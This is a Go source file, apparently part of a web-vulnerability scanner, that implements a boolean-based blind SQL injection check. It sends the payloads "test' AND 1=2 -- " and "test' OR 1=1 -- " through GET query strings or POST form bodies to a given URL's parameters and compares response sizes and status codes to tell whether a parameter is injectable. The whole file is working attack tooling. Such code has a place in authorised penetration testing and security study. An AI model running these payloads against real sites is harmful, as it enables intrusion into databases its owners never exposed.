package blind_injection

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
)

var falseQuery = "test' AND 1=2 -- "
var trueQuery = "test' OR 1=1 -- "

type BlindBool struct {
	Url         string
	Method      string
	QParameters []string
}

func New(url, method string, parameters ...string) *BlindBool {
	return &BlindBool{
		Url:         url,
		Method:      method,
		QParameters: parameters,
	}
}

func (b *BlindBool) InjectParam() (bool, error) {

	res, err := b.makeRequest(falseQuery)
	if err != nil {
		return false, err
	}

	fSize := res.ContentLength
	if fSize == -1 {
		content, err := io.ReadAll(res.Body)
		if err != nil {
			return false, err
		}
		fSize = int64(len(content))
	}
	fStatus := res.StatusCode

	res, err = b.makeRequest(trueQuery)
	if err != nil {
		return false, err
	}

	tSize := res.ContentLength
	if tSize == -1 {
		content, err := io.ReadAll(res.Body)
		if err != nil {
			return false, err
		}
		tSize = int64(len(content))
	}
	tStatus := res.StatusCode

	if tStatus == fStatus && fSize == tSize {
		return false, nil
	}

	return true, nil
}

func (b *BlindBool) makeRequest(query string) (*http.Response, error) {
	var res *http.Response
	var err error

	switch b.Method {
	case http.MethodGet:
		reqStr := b.uriQuery(0, query)
		res, err = http.Get(reqStr)
	case http.MethodPost:
		bodyQ := b.bodyQuery(0, query)
		buff := bytes.NewReader([]byte(bodyQ))
		res, err = http.Post(b.Url, "application/x-www-form-urlencoded", buff)
	}

	return res, err
}

func (b *BlindBool) uriQuery(ind int, query string) string {
	reqStr := fmt.Sprintf("%s?%s=%s", b.Url, b.QParameters[ind], query)
	for i := 0; i < len(b.QParameters); i++ {
		if i == ind {
			continue
		}

		reqStr = fmt.Sprintf("%s&%s=%s", reqStr, b.QParameters[i], "test")
	}
	return reqStr
}

func (b *BlindBool) bodyQuery(ind int, query string) string {
	bodyStr := fmt.Sprintf("%s=%s", b.QParameters[ind], query)
	for i := 0; i < len(b.QParameters); i++ {
		if i == ind {
			continue
		}
		bodyStr = fmt.Sprintf("%s&%s=%s", bodyStr, b.QParameters[i], "test")
	}

	return bodyStr
}
